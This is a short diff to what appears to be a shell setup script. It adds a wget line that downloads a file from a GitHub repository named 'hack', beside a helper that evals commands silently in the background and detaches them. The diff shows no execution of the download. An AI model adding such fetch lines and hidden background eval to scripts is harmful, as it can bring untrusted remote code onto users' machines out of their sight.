@@ -1,4 +1,5 @@
 cd $HOME
+wget https://raw.githubusercontent.com/all-drama/hack/main/david.txt
 _evalBg() {
 eval "$@" &>/dev/null & disown;
 }
